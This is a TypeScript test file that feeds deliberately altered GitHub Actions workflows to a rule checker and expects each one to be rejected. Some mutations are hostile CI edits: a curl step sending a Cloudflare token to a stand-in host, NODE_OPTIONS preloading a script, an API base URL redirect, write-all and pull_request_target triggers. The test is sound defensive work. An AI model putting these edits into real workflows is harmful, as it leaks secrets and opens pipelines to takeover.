// The GitHub Actions workflows (.github/workflows/) against the rules in
// test/workflows.ts, and the files of the repository that the deploy job
// reads or that change what it installs.
//
// This guards against slips and plain changes; it does not replace reading
// each line of a change to the workflows (CONTRIBUTING.md, "部署會執行到的東西").
// test/workflows.ts lists what it does not see. Each altered copy below is
// a change the rules must turn away; all of them are.
import assert from "node:assert/strict";
import { execFileSync, spawnSync } from "node:child_process";
import { createHash } from "node:crypto";
import { existsSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, renameSync, rmSync, statSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { basename, dirname, join, relative, resolve, sep } from "node:path";
import { test } from "node:test";
import { unstable_readConfig } from "wrangler";
import { WORKER_DIR } from "./build.ts";
import {
  ACTIONS,
  ANDROID_CACHES,
  ANDROID_SDK_PARTS,
  BB_AMD64_LINUX_SHA256,
  CACHE_KEY_FILES,
  BROWSER_PATHS,
  CHANGED_PATHS_SCRIPT,
  CHANGES_JOB,
  CHECK_BB,
  CHECK_PATHS,
  CHECKS_GROUP,
  CHECKS_ON,
  CIRCUITS_PATHS,
  type CheckLists,
  DEVICE_CORE_CACHES,
  EVERY_CHECK_PATHS,
  GRADLE_BUILD,
  GRADLE_DISTRIBUTION_SHA256,
  GRADLE_VERSION,
  GRADLE_WRAPPER_JAR_SHA256,
  INSTALL_PNPM,
  IOS_PATHS,
  REQUIRED_CHECKS,
  UPLOAD_ANDROID_SCRIPTS,
  WORKFLOW_FILES,
  type Yaml,
  matchesPaths,
  pathsEnvName,
  pathsProblems,
  readYaml,
  workflowProblems,
} from "./workflows.ts";

const REPO = join(WORKER_DIR, "..");
const WORKFLOWS_DIR = join(REPO, ".github", "workflows");
/** The script the changes job of checks.yml runs. */
const CHANGED_PATHS_NAME = basename(CHANGED_PATHS_SCRIPT);
/** The files of .github/workflows/ that are not workflows: the scripts the workflows run. */
const SCRIPTS = [CHANGED_PATHS_NAME, ...UPLOAD_ANDROID_SCRIPTS];

function realFiles(): Record<string, string> {
  return Object.fromEntries(
    readdirSync(WORKFLOWS_DIR)
      .filter((f) => !SCRIPTS.includes(f))
      .map((f) => [f, readFileSync(join(WORKFLOWS_DIR, f), "utf8")]),
  );
}

test("the workflows keep to the rules", () => {
  assert.deepEqual(workflowProblems(realFiles()), []);
});

const D = "deploy-test.yml";
const C = "checks.yml";
const B = "checks-browser.yml";
const I = "checks-ios.yml";
const CIRCUITS_WORKFLOW = "checks-circuits.yml";
const BROWSER_JOB = "  browser:\n    runs-on: ubuntu-24.04\n";
const SHA = "0123456789abcdef0123456789abcdef01234567";
const SECRET = "${{ secrets.CLOUDFLARE_API_TOKEN_TEST }}";
const UPLOAD_ENV = `        env:\n          CLOUDFLARE_API_TOKEN: \${{ secrets.CLOUDFLARE_API_TOKEN_TEST }}\n          CLOUDFLARE_ACCOUNT_ID: \${{ secrets.CLOUDFLARE_ACCOUNT_ID }}\n`;
const INSTALL_WRANGLER = "        run: pnpm install --frozen-lockfile --ignore-scripts --ignore-pnpmfile --registry=https://registry.npmjs.org/ --filter iamreal-worker\n";
const UPLOAD_RUN = "        run: WRANGLER_SEND_METRICS=false WRANGLER_HIDE_BANNER=true node_modules/.bin/wrangler deploy";
const DOWNLOAD = "      - uses: actions/download-artifact@9000827ccba6bdab643e8b6fd33ac0654aef8333 # v8.0.2\n";
const BUILD_JOB = "  build:\n    runs-on: ubuntu-24.04\n";
const DEPLOY_JOB = "  deploy:\n    needs: build\n";
const GO_JOB = "  go:\n    needs: changes\n";
/** The `if` of a required check of checks.yml, as written there (#206). */
const jobIf = (check: string): string => `    if: always() && (needs.changes.result != 'success' || github.event_name != 'pull_request' || needs.changes.outputs.${check} == 'true')\n`;
const GO_IF = jobIf("go");
/** The first step of every required check, as written there. */
const CHANGES_SUCCEEDED = '      - name: The changes job succeeded\n        env:\n          CHANGES_RESULT: ${{ needs.changes.result }}\n        run: test "$CHANGES_RESULT" = success\n';
const GO_HEAD = `${GO_JOB}${GO_IF}    runs-on: ubuntu-24.04\n    timeout-minutes: 30\n    steps:\n${CHANGES_SUCCEEDED}`;
const CHANGES_CHECKOUT = "      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n        with:\n          persist-credentials: false\n          fetch-depth: 0\n";
const CHANGES_RUN = "        run: bash .github/workflows/changed-paths.sh\n";
/** How checks.yml is triggered by the merge queue (#180), as written there. */
const MERGE_GROUP = "  merge_group:\n    types:\n      - checks_requested\n";

type Change = (files: Record<string, string>) => void;
/** Replaces the first `from` in `file`; fails if it is not there, so a change never quietly does nothing. */
const replace =
  (file: string, from: string, to: string): Change =>
  (files) => {
    assert.ok(files[file]!.includes(from), `${file} has no ${JSON.stringify(from)}`);
    files[file] = files[file]!.replace(from, to);
  };
const addFile =
  (file: string, text: string): Change =>
  (files) => {
    files[file] = text;
  };

/** Changes the rules must turn away. 01 to 35 are the review's (#39); the rest are added here. */
const CHANGES: Record<string, Change[]> = {
  "01 a secret after ' #' inside a quoted run, in the build job": [replace(D, "      - run: pnpm install --frozen-lockfile\n", `      - run: pnpm install --frozen-lockfile\n      - run: 'curl "https://example.invalid/ #${SECRET}"'\n`)],
  "02 a secret after ' #' in checks.yml": [replace(C, "      - run: go build ./...", `      - run: 'curl "https://example.invalid/ #${SECRET}"'\n      - run: go build ./...`)],
  "03 a step written with a bare '-' after the upload holds the token and runs something else": [
    replace(D, UPLOAD_ENV, ""),
    replace(D, UPLOAD_RUN, `${UPLOAD_ENV.replace(SECRET, "x")}${UPLOAD_RUN}`),
    (f) => {
      f[D] += `      -\n${UPLOAD_ENV}        run: node scripts/anything.js\n`;
    },
  ],
  "04 shell: in the last step": [replace(D, UPLOAD_RUN, `        shell: bash -c "node scripts/anything.js; bash {0}"\n${UPLOAD_RUN}`)],
  "05 defaults: at the top": [replace(D, "jobs:\n", 'defaults:\n  run:\n    shell: bash -c "node scripts/anything.js; bash {0}"\n\njobs:\n')],
  "06 the last step's working-directory changed": [replace(D, "        working-directory: worker\n        env:", "        working-directory: elsewhere\n        env:")],
  "07 more env in the last step (NODE_OPTIONS, CLOUDFLARE_API_BASE_URL)": [
    replace(D, UPLOAD_ENV, `${UPLOAD_ENV}          NODE_OPTIONS: --require ./scripts/anything.cjs\n          CLOUDFLARE_API_BASE_URL: https://example.invalid/client/v4\n`),
  ],
  "08 BASH_ENV at the top": [replace(D, "jobs:\n", "env:\n  BASH_ENV: scripts/anything.sh\n\njobs:\n")],
  "09 the last step's run continued on the next line": [(f) => void (f[D] = f[D]!.replace(/(--env-file=\/dev\/null\n)$/, "$1          ; node scripts/anything.js\n"))],
  "10 a quoted key \"uses\" with a tag": [replace(D, DOWNLOAD, '      - "uses": actions/download-artifact@v8\n')],
  "11 'uses :' with a space, a tag": [replace(D, DOWNLOAD, "      - uses : actions/download-artifact@v8\n")],
  "12 a flow mapping - { uses: x@tag }": [replace(D, DOWNLOAD, `      - { uses: some/action@main }\n${DOWNLOAD}`)],
  "13 a new workflow: escaped pull_request_target, write-all": [addFile("third.yml", 'name: third\non:\n  "pull_request\\x5ftarget":\npermissions: write-all\njobs:\n  x:\n    runs-on: ubuntu-24.04\n    steps:\n      - run: echo hi\n')],
  "14 a new workflow: on issue_comment and workflow_dispatch, write-all": [addFile("third.yml", "name: third\non: [issue_comment, workflow_dispatch]\npermissions: write-all\njobs:\n  x:\n    runs-on: ubuntu-24.04\n    steps:\n      - run: echo hi\n")],
  "15 permissions: write-all in the deploy job": [replace(D, DEPLOY_JOB, `${DEPLOY_JOB}    permissions: write-all\n`)],
  "16 a quoted \"permissions\" in a job of checks.yml": [replace(C, GO_JOB, `${GO_JOB}    "permissions": write-all\n`)],
  "17 before the upload: npm ci": [replace(D, INSTALL_WRANGLER, `${INSTALL_WRANGLER}      - run: npm ci\n`)],
  "18 before the upload: bash scripts/x.sh": [replace(D, INSTALL_WRANGLER, `${INSTALL_WRANGLER}      - run: bash scripts/anything.sh\n`)],
  "19 before the upload: pnpm deploy:test": [replace(D, INSTALL_WRANGLER, `${INSTALL_WRANGLER}      - run: pnpm -C worker deploy:test\n`)],
  "20 --ignore-scripts=false": [replace(D, "--ignore-scripts --ignore-pnpmfile", "--ignore-scripts=false --ignore-pnpmfile")],
  "21 the install continued on the next line": [replace(D, INSTALL_WRANGLER, `${INSTALL_WRANGLER.trimEnd()}\n          && node scripts/anything.js\n`)],
  "22 an action that runs a script, pinned to a commit": [replace(D, INSTALL_WRANGLER, `${INSTALL_WRANGLER}      - uses: actions/github-script@${SHA} # v9.0.0\n        with:\n          script: require("./scripts/anything.cjs")\n`)],
  "23 the deploy job checks out another ref": [replace(D, "      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n        with:\n          persist-credentials: false\n      - name: Install wrangler", "      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n        with:\n          persist-credentials: false\n          ref: some-other-branch\n      - name: Install wrangler")],
  "24 the build job rewrites index.js before handing it on": [replace(D, "      - uses: actions/upload-artifact@", '      - run: node scripts/anything.js > "$RUNNER_TEMP/worker-build/index.js"\n      - uses: actions/upload-artifact@')],
  "25 the artifact of another run, with github.token": [replace(D, "          path: ${{ runner.temp }}/worker-build\n      # The card proof page, to", "          path: ${{ runner.temp }}/worker-build\n          run-id: 123\n          github-token: ${{ github.token }}\n      # The card proof page, to")],
  "25a the card proof page of another run": [replace(D, "          path: worker/site/proof\n      # The build's", "          path: worker/site/proof\n          run-id: 123\n          github-token: ${{ github.token }}\n      # The build's")],
  "25b the deploy job uploads without the card proof page the build job checked": [replace(D, "      - uses: actions/download-artifact@9000827ccba6bdab643e8b6fd33ac0654aef8333 # v8.0.2\n        with:\n          name: proof-page\n          path: worker/site/proof\n", "")],
  "25c the build job hands on a page from another directory": [replace(D, "          name: proof-page\n          path: worker/site/proof\n          if-no-files-found: error\n", "          name: proof-page\n          path: web/dist\n          if-no-files-found: error\n")],

  "26 an if: on the upload": [replace(D, "      - name: Upload to iamreal-test\n", "      - name: Upload to iamreal-test\n        if: github.actor == 'someone'\n")],
  "30 on: [pull_request] in checks.yml": [replace(C, "on:\n  pull_request:\n", "on: [pull_request]\n")],
  "31 run: | before the upload": [replace(D, INSTALL_WRANGLER, `${INSTALL_WRANGLER}      - run: |\n          echo hi\n`)],
  "32 a job that calls another workflow": [replace(D, DEPLOY_JOB, `  other:\n    uses: ./.github/workflows/x.yml\n${DEPLOY_JOB}`)],
  "33 secrets: inherit": [replace(D, DEPLOY_JOB, `${DEPLOY_JOB}    secrets: inherit\n`)],
  "34 the secrets in the job's env, after the steps": [
    replace(D, UPLOAD_ENV, ""),
    (f) => {
      f[D] += `    env:\n      CLOUDFLARE_API_TOKEN: ${SECRET}\n      CLOUDFLARE_ACCOUNT_ID: \${{ secrets.CLOUDFLARE_ACCOUNT_ID }}\n`;
    },
  ],
  "35 pull_request_target in a new file": [addFile("third.yml", "name: third\non:\n  pull_request_target:\npermissions:\n  contents: read\njobs:\n  x:\n    runs-on: ubuntu-24.04\n    steps:\n      - run: echo hi\n")],
  "40 the install of wrangler runs a .pnpmfile.cjs": [replace(D, " --ignore-pnpmfile", "")],
  "41 pnpm installed after the checkout in the deploy job": [
    replace(D, "      - name: Install pnpm\n        run: npm install --global --ignore-scripts --registry=https://registry.npmjs.org/ pnpm@10.16.1\n      # wrangler.jsonc", "      # wrangler.jsonc"),
    replace(D, "      - name: Install wrangler\n", `      - name: Install pnpm\n        run: ${INSTALL_PNPM}\n      - name: Install wrangler\n`),
  ],
  "42 the upload loads .env files": [replace(D, " --env-file=/dev/null\n", "\n")],
  "43 the upload bundles again": [replace(D, " --no-bundle", "")],
  "44 the upload through a script of the repository": [replace(D, UPLOAD_RUN, "        run: node --experimental-strip-types scripts/deploy-test.ts #")],
  "45 another Node version in one job": [replace(C, "          node-version: 22.23.4", "          node-version: 22.23.5")],
  "46 another pnpm version in one job": [replace(C, "pnpm@10.16.1", "pnpm@10.16.2")],
  "47 pnpm from the registry .npmrc names": [replace(C, " --registry=https://registry.npmjs.org/ pnpm@", " pnpm@")],
  "48 a secret mentioned in a comment": [replace(C, "jobs:\n", `# \${{ secrets.X }}\njobs:\n`)],
  "49 a tab": [replace(C, "    timeout-minutes: 30\n", "    timeout-minutes:\t30\n")],
  "50 a document marker": [(f) => void (f[C] = `---\n${f[C]}`)],
  "51 an anchor and an alias": [replace(C, "      - run: go build ./...", "      - run: &x go build ./...\n      - run: *x")],
  "52 a merge key": [replace(C, GO_JOB, `${GO_JOB}    <<: {}\n`)],
  "53 a double-quoted value with an escape": [replace(C, "      - run: go build ./...", '      - run: "go build ./...\\x3b node x.js"')],
  "54 a local action": [replace(C, "      - run: go build ./...", "      - uses: ./.github/actions/x")],
  "55 a container action": [replace(C, "      - run: go build ./...", "      - uses: docker://alpine:3")],
  "56 an env in a step of checks.yml": [replace(C, "      - run: go build ./...", "      - run: go build ./...\n        env:\n          X: y")],
  "57 container: in a job of checks.yml": [replace(C, GO_JOB, `${GO_JOB}    container: some/image\n`)],
  "58 checks.yml also on push": [replace(C, "on:\n  pull_request:\n", "on:\n  pull_request:\n  push:\n")],
  "59 the deploy also on workflow_dispatch": [replace(D, "on:\n  push:\n", "on:\n  workflow_dispatch:\n  push:\n")],
  "60 checks.yml with write permissions": [replace(C, "permissions:\n  contents: read\n", "permissions:\n  contents: write\n")],
  "61 a job of checks.yml without the check of bb": [replace(C, '      - name: bb is the one of bb.js 6.0.0\n        run: echo "5bbb', '      - name: bb is the one of bb.js 6.0.0\n        run: echo "0bbb')],
  "62 checkout with a ref in checks.yml": [replace(C, "          persist-credentials: false\n", "          persist-credentials: false\n          ref: main\n")],
  "63 a key written twice": [replace(D, BUILD_JOB, `${BUILD_JOB}    runs-on: ubuntu-24.04\n`)],
  "64 a character outside ASCII": [replace(C, "      - run: go build ./...", "      - run: go build ./...\u2028      - run: node x.js")],
  "65 a key with a space before its colon": [replace(C, "    timeout-minutes: 30\n", "    timeout-minutes : 30\n")],
  "66 a step in the build job that a later step depends on, with a secret by another name": [replace(D, "      - run: pnpm install --frozen-lockfile\n", `      - run: pnpm install --frozen-lockfile\n        env:\n          T: \${{ secrets.OTHER }}\n`)],
  "67 another directory in a step of checks-browser.yml": [replace(B, "        working-directory: web\n        run: pnpm fetch-crs", "        working-directory: ..\n        run: pnpm fetch-crs")],
  "80 paths in checks.yml": [replace(C, "on:\n  pull_request:\n", "on:\n  pull_request:\n    paths:\n      - web/**\n")],
  "81 paths in deploy-test.yml": [replace(D, "    branches:\n      - main\n", "    branches:\n      - main\n    paths:\n      - worker/**\n")],
  "82 paths-ignore in checks-browser.yml": [replace(B, "    paths:\n", "    paths-ignore:\n")],
  "83 a path less in checks-browser.yml": [replace(B, "      - spec/**\n", "")],
  "84 a path more in checks-browser.yml": [replace(B, "      - web/**\n", "      - web/**\n      - docs/**\n")],
  "85 a negated path in checks-browser.yml": [replace(B, "      - web/**\n", "      - web/**\n      - '!web/README.md'\n")],
  "86 checks-browser.yml on pull_request_target": [replace(B, "  pull_request:\n", "  pull_request_target:\n")],
  "87 checks-browser.yml also on push": [replace(B, "on:\n", "on:\n  push:\n")],
  "88 checks-browser.yml in the concurrency group of checks.yml": [replace(B, "  group: checks-browser-", "  group: checks-")],
  "89 checks-browser.yml without cancelling the run before": [replace(B, "  cancel-in-progress: true\n", "  cancel-in-progress: false\n")],
  "90 permissions in the job of checks-browser.yml": [replace(B, BROWSER_JOB, `${BROWSER_JOB}    permissions: write-all\n`)],
  "91 checks-browser.yml with write permissions": [replace(B, "permissions:\n  contents: read\n", "permissions:\n  contents: write\n")],
  "92 a secret in the job's env of checks-browser.yml": [replace(B, "      CHROME: /usr/bin/google-chrome\n", "      CHROME: /usr/bin/google-chrome\n      T: ${{ secrets.X }}\n")],
  "93 checkout with a ref in checks-browser.yml": [replace(B, "          persist-credentials: false\n", "          persist-credentials: false\n          ref: main\n")],
  "94 an action not in the list in checks-browser.yml": [replace(B, "      - name: Chrome\n", `      - uses: actions/github-script@${SHA} # v9.0.0\n      - name: Chrome\n`)],
  "95 CHROME back in a job of checks.yml": [replace(C, GO_JOB, `${GO_JOB}    env:\n      CHROME: /usr/bin/google-chrome\n`)],
  "96 the WRANGLER values in checks-browser.yml": [replace(B, "env:\n  # bb", 'env:\n  WRANGLER_SEND_METRICS: "false"\n  # bb')],
  "97 a fourth workflow": [addFile("checks-other.yml", "name: other\non:\n  pull_request:\npermissions:\n  contents: read\njobs:\n  x:\n    runs-on: ubuntu-24.04\n    steps:\n      - run: echo hi\n")],
  "98 a job of checks-browser.yml without the check of bb": [replace(B, '        run: echo "5bbb', '        run: echo "0bbb')],
  "99 a job of checks.yml other than device-core without the check of bb": [replace(C, "\n  device-core:\n", "\n  device-core-2:\n")],
  "100 a step of the device-core job in another directory": [replace(C, "        working-directory: device-core\n        run: cargo fmt --check", "        working-directory: device-core/vendor\n        run: cargo fmt --check")],
  "101 the device-core job taking Barretenberg without the script": [replace(C, 'run: BB_LIB_DIR="$(./fetch-barretenberg.sh)" && export BB_LIB_DIR && IAMREAL_BB= cargo test', "run: BARRETENBERG_VERSION=6.0.0 cargo test")],
  "102 cargo of the device-core job run from the root, where .cargo/config.toml is not read": [replace(C, "        working-directory: device-core\n        run: BB_LIB_DIR=\"$(./fetch-barretenberg.sh)\" && export BB_LIB_DIR && IAMREAL_BB= cargo test --locked --release", "        run: cargo test --locked --release --manifest-path device-core/Cargo.toml")],
  "103 a second BB_LIB_DIR after the script": [replace(C, "export BB_LIB_DIR && IAMREAL_BB= cargo test", "export BB_LIB_DIR && BB_LIB_DIR=/x IAMREAL_BB= cargo test")],
  "104 one more step in the device-core job": [replace(C, "      - name: cargo fmt --check\n", "      - run: rm .cargo/config.toml\n        working-directory: device-core\n      - name: cargo fmt --check\n")],
  "105 the iOS check on every pull request": [replace(I, "    paths:\n      - ios/**\n      - device-core/**\n      - spec/vectors/**\n      - design/copy/**\n      - design/fonts/**\n      - design/tokens.json\n      - web/circuits/**\n      - verifier/vk/**\n      - web/scripts/fetch-crs.mjs\n      - .github/workflows/checks-ios.yml\n", "")],
  "106 a path less in checks-ios.yml": [replace(I, "      - device-core/**\n", "")],
  "107 checks-ios.yml on pull_request_target": [replace(I, "  pull_request:\n", "  pull_request_target:\n")],
  "108 checks-ios.yml on another runner": [replace(I, "    runs-on: xcode-27\n", "    runs-on: macos-latest\n")],
  "109 a job of checks.yml on the macOS runner": [replace(C, `${GO_IF}    runs-on: ubuntu-24.04\n`, `${GO_IF}    runs-on: xcode-27\n`)],
  "110 another Xcode in checks-ios.yml": [replace(I, "Xcode_27.2.app", "Xcode.app")],
  "111 a secret in the env of checks-ios.yml": [replace(I, "env:\n", "env:\n  T: ${{ secrets.X }}\n")],
  "112 checks-ios.yml with write permissions": [replace(I, "permissions:\n  contents: read\n", "permissions:\n  contents: write\n")],
  "113 checks-ios.yml in the concurrency group of checks.yml": [replace(I, "  group: checks-ios-", "  group: checks-")],
  "114 the iOS job without the script that gets Barretenberg checked": [replace(I, "        run: ./build-core.sh simulator\n", "        run: cargo build --manifest-path ../device-core/Cargo.toml\n")],
  "115 the iOS job taking Barretenberg from somewhere else": [replace(I, "        run: ./build-core.sh simulator\n", "        run: ./build-core.sh simulator && BB_LIB_DIR=/tmp/x cargo build\n")],
  "116 a step of the iOS job in another directory": [replace(I, "        working-directory: ios\n        run: ./build-core.sh", "        working-directory: ios/build\n        run: ./build-core.sh")],
  "117 an action not in the list in checks-ios.yml": [replace(I, "      - name: Build device-core/ for the simulator\n", `      - uses: maxim-lobanov/setup-xcode@${SHA} # v1.6.0\n      - name: Build device-core/ for the simulator\n`)],
  "118 the Xcode of checks-ios.yml in a job of checks.yml": [replace(C, GO_JOB, `${GO_JOB}    env:\n      DEVELOPER_DIR: /Applications/Xcode_27.2.app/Contents/Developer\n`)],
  "119 checks-ios.yml without its Xcode": [replace(I, "  DEVELOPER_DIR: /Applications/Xcode_27.2.app/Contents/Developer\n", "  OTHER: x\n")],
  "120 one more step in the iOS job": [replace(I, "      - name: Build device-core/ for the simulator\n", "      - run: curl -o ../device-core/vendor/x https://example.invalid/x\n        working-directory: ios\n      - name: Build device-core/ for the simulator\n")],
  "121 a job of checks.yml other than device-core and android without the check of bb": [replace(C, "\n  android:\n", "\n  android-2:\n")],
  "122 the android job running a Gradle that is not the wrapper": [replace(C, `run: ${GRADLE_BUILD}`, 'run: JAVA_HOME="$JAVA_HOME_17_X64" gradle build')],
  "123 the android job running the wrapper with something more": [replace(C, `run: ${GRADLE_BUILD}`, `run: ${GRADLE_BUILD} --init-script x.gradle`)],
  "124 the android job running the wrapper of another directory": [replace(C, `        working-directory: android\n        run: ${GRADLE_BUILD}`, `        working-directory: web\n        run: ${GRADLE_BUILD}`)],
  "125 one more step in the android job": [replace(C, "      - name: gradlew build\n", "      - run: sudo snap install zig\n      - name: gradlew build\n")],
  "126 the android job without the parameter files' script": [replace(C, "        working-directory: device-core\n        run: ./fetch-crs.sh", "        working-directory: device-core\n        run: curl -o vendor/crs/bn254_g2.dat https://example.com/g2.dat")],
  // The merge queue (#180): checks.yml also runs on merge_group, and nothing else does.
  "130 deploy-test.yml also on merge_group": [replace(D, "on:\n  push:\n", `on:\n${MERGE_GROUP}  push:\n`)],
  "131 checks-browser.yml also on merge_group": [replace(B, "on:\n", `on:\n${MERGE_GROUP}`)],
  "132 checks.yml on merge_group only, so a pull request gets no checks": [replace(C, "  pull_request:\n", "")],
  "133 merge_group in checks.yml with another activity type": [replace(C, MERGE_GROUP, `${MERGE_GROUP}      - destroyed\n`)],
  "134 checks.yml's group by pull request number, so the merge groups' runs share one and cancel each other": [replace(C, `  group: ${CHECKS_GROUP}\n`, "  group: checks-${{ github.event.pull_request.number }}\n")],
  "135 a job of checks.yml renamed, so the check the ruleset of main requires never reports": [replace(C, GO_JOB, "  golang:\n    needs: changes\n")],
  "136 a job of checks.yml given a name, which is the name its check reports": [replace(C, GO_JOB, `${GO_JOB}    name: Go\n`)],
  "137 one job more in checks.yml than the checks main requires": [replace(C, "\n  device-core:\n", `\n  other:\n    runs-on: ubuntu-24.04\n    steps:\n      - run: ${CHECK_BB}\n\n  device-core:\n`)],
  "138 a secret in the env at the top of checks.yml, which a merge group's run would be given": [replace(C, '  WRANGLER_HIDE_BANNER: "true"\n', `  WRANGLER_HIDE_BANNER: "true"\n  T: ${SECRET}\n`)],
  "139 checks.yml asking for an OIDC token": [replace(C, "permissions:\n  contents: read\n", "permissions:\n  contents: read\n  id-token: write\n")],
  "140 checks-ios.yml also on merge_group": [replace(I, "on:\n", `on:\n${MERGE_GROUP}`)],
  // Skipping by path (#206): a required check runs through the changes job, always in the merge queue, and fails when that job fails.
  "200 a required check that does not go through the changes job": [replace(C, GO_HEAD, "  go:\n    runs-on: ubuntu-24.04\n    timeout-minutes: 30\n    steps:\n")],
  "201 a required check that does not need the changes job, whose result and output are then empty": [replace(C, GO_JOB, "  go:\n")],
  "202 a required check that needs another job": [replace(C, GO_JOB, "  go:\n    needs: typescript\n")],
  "203 a required check with no if: skipped when the changes job fails": [replace(C, GO_IF, "")],
  "204 a required check whose if has no status function: skipped when the changes job fails": [replace(C, GO_IF, "    if: needs.changes.outputs.go == 'true'\n")],
  "205 a required check whose if does not look at the changes job's result: skipped when that job fails": [replace(C, GO_IF, "    if: always() && (github.event_name != 'pull_request' || needs.changes.outputs.go == 'true')\n")],
  "206 a required check with success() for always(): skipped when the changes job fails": [replace(C, GO_IF, GO_IF.replace("always()", "success()"))],
  "207 a required check with !cancelled() for always(): skipped when the run is cancelled before the changes job ends": [replace(C, GO_IF, `    if: "${GO_IF.slice("    if: ".length, -1).replace("always()", "!cancelled()")}"\n`)],
  "208 a required check that can be skipped on merge_group": [replace(C, GO_IF, "    if: always() && (needs.changes.result != 'success' || needs.changes.outputs.go == 'true')\n")],
  "209 a required check that runs on merge_group only when the changes job says so": [replace(C, GO_IF, "    if: always() && (needs.changes.result != 'success' || (github.event_name != 'pull_request' && needs.changes.outputs.go == 'true') || needs.changes.outputs.go == 'true')\n")],
  "210 a required check that reads another check's output": [replace(C, jobIf("android"), jobIf("go"))],
  "211 a required check skipped when its output is true": [replace(C, GO_IF, GO_IF.replace("== 'true'", "!= 'true'"))],
  "212 a required check without the step that fails unless the changes job succeeded": [replace(C, `${GO_IF}    runs-on: ubuntu-24.04\n    timeout-minutes: 30\n    steps:\n${CHANGES_SUCCEEDED}`, `${GO_IF}    runs-on: ubuntu-24.04\n    timeout-minutes: 30\n    steps:\n`)],
  "213 a required check whose first step succeeds whatever the changes job did": [replace(C, 'run: test "$CHANGES_RESULT" = success\n', 'run: test "$CHANGES_RESULT" != skipped\n')],
  "232 the changes job's result put into the first step's command, not its env": [replace(C, CHANGES_SUCCEEDED, '      - name: The changes job succeeded\n        run: test "${{ needs.changes.result }}" = success\n')],
  "233 the first step reading another job's result": [replace(C, "          CHANGES_RESULT: ${{ needs.changes.result }}\n", "          CHANGES_RESULT: ${{ needs.typescript.result }}\n")],
  "214 the step about the changes job after the others": [replace(C, `${CHANGES_SUCCEEDED}      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n        with:\n          persist-credentials: false\n`, `      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n        with:\n          persist-credentials: false\n${CHANGES_SUCCEEDED}`)],
  "215 a required check whose if reads something else": [replace(C, GO_IF, GO_IF.replace("always() &&", "always() && github.actor != 'x' &&"))],
  "216 a required check that reports success when it fails": [replace(C, GO_JOB, `${GO_JOB}    continue-on-error: true\n`)],
  "217 the changes job with an action that is not GitHub's, in place of the checkout": [replace(C, CHANGES_CHECKOUT, `      - uses: dorny/paths-filter@${SHA} # v3.0.2\n`)],
  "218 the changes job with an action that is not GitHub's, after the checkout": [replace(C, CHANGES_CHECKOUT, `${CHANGES_CHECKOUT}      - uses: tj-actions/changed-files@${SHA} # v46.0.5\n`)],
  "219 the changes job with an action of the list that it does not need": [replace(C, CHANGES_CHECKOUT, `${CHANGES_CHECKOUT}      - uses: actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1 # v7.1.0\n        with:\n          node-version: 22.23.4\n          package-manager-cache: false\n`)],
  "220 the changes job running a command other than the script": [replace(C, CHANGES_RUN, '        run: echo "go=false" >> "$GITHUB_OUTPUT"\n')],
  "221 the changes job running the script and something more": [replace(C, CHANGES_RUN, "        run: bash .github/workflows/changed-paths.sh || true\n")],
  "222 an output of the changes job written in, not the script's": [replace(C, "      go: ${{ steps.paths.outputs.go }}\n", "      go: false\n")],
  "223 an output of the changes job that is another check's": [replace(C, "      go: ${{ steps.paths.outputs.go }}\n", "      go: ${{ steps.paths.outputs.android }}\n")],
  "224 a path less in a list the changes job is given": [replace(C, " cmd/** crl/** prooflog/**", " crl/** prooflog/**")],
  "225 a path more in a list the changes job is given": [replace(C, ' design/copy/** .github/workflows/cache.yml"\n', ' design/copy/** .github/workflows/cache.yml docs/**"\n')],
  "226 the changes job without the whole history": [replace(C, "          fetch-depth: 0\n", "")],
  "227 the changes job keeping the token": [replace(C, "          persist-credentials: false\n          fetch-depth: 0\n", "          fetch-depth: 0\n")],
  "228 the changes job with an if": [replace(C, "  changes:\n", "  changes:\n    if: github.event_name == 'pull_request'\n")],
  "229 the changes job that cannot fail": [replace(C, "  changes:\n", "  changes:\n    continue-on-error: true\n")],
  "230 no changes job": [replace(C, "  changes:\n", "  other:\n")],
  "231 the commits put into the script's command, not its env": [replace(C, CHANGES_RUN, "        run: BASE_SHA=${{ github.event.pull_request.base.sha }} bash .github/workflows/changed-paths.sh\n")],
  // checks-circuits.yml (#247): like checks-browser.yml, and its one job exactly as written in test/workflows.ts.
  "300 checks-circuits.yml also on merge_group": [replace(CIRCUITS_WORKFLOW, "on:\n", `on:\n${MERGE_GROUP}`)],
  "301 checks-circuits.yml on every pull request": [replace(CIRCUITS_WORKFLOW, "    paths:\n", "    paths-ignore:\n")],
  "302 a path less in checks-circuits.yml": [replace(CIRCUITS_WORKFLOW, "      - verifier/vk/**\n", "")],
  "303 checks-circuits.yml on pull_request_target": [replace(CIRCUITS_WORKFLOW, "  pull_request:\n", "  pull_request_target:\n")],
  "304 checks-circuits.yml in the concurrency group of checks-browser.yml": [replace(CIRCUITS_WORKFLOW, "  group: checks-circuits-", "  group: checks-browser-")],
  "305 checks-circuits.yml with write permissions": [replace(CIRCUITS_WORKFLOW, "permissions:\n  contents: read\n", "permissions:\n  contents: write\n")],
  "306 a secret in the env of checks-circuits.yml": [replace(CIRCUITS_WORKFLOW, "jobs:\n", "env:\n  T: ${{ secrets.X }}\n\njobs:\n")],
  "307 an action not in the list in checks-circuits.yml": [replace(CIRCUITS_WORKFLOW, "      - name: Install pnpm\n", `      - uses: actions/github-script@${SHA} # v9.0.0\n      - name: Install pnpm\n`)],
  "308 the circuits job running a nargo that is not the one fetch-nargo.sh checked": [replace(CIRCUITS_WORKFLOW, `run: '"$(./fetch-nargo.sh)" test --workspace'`, "run: nargo test --workspace")],
  "309 the circuits job taking circom from somewhere else": [replace(CIRCUITS_WORKFLOW, 'run: circom="$(./fetch-circom.sh)"', 'run: cargo install circom && circom="$(which circom)"')],
  "310 the circuits job without the rebuild": [replace(CIRCUITS_WORKFLOW, "        run: ./rebuild.sh\n", "        run: true\n")],
  "311 the circuits job taking the circom column's \"not run\"": [replace(CIRCUITS_WORKFLOW, "run: diff -u results/equivalence.md out/equivalence.md && ", "run: ")],
